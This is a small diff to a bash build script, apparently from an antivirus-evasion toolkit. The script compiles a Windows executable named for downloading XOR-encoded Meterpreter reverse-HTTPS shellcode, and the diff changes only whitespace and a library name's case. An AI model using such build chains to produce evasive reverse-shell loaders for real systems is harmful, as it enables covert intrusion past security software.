@@ -1,4 +1,4 @@
-#!/bin/bash 
+#!/bin/bash
 
 
 #DESCRIPTION_START
@@ -49,7 +49,7 @@ set_payload_info_source no_data
 set_payload_execution_method exec_shellcode64
 
 # compile
-$win64_compiler -o output/downloadsocket_mtrprtrxor_revhttps_win64.exe source/avet.c -lwsock32 -lWs2_32
+$win64_compiler -o output/downloadsocket_mtrprtrxor_revhttps_win64.exe source/avet.c -lwsock32 -lws2_32
 strip output/downloadsocket_mtrprtrxor_revhttps_win64.exe
 
 # cleanup
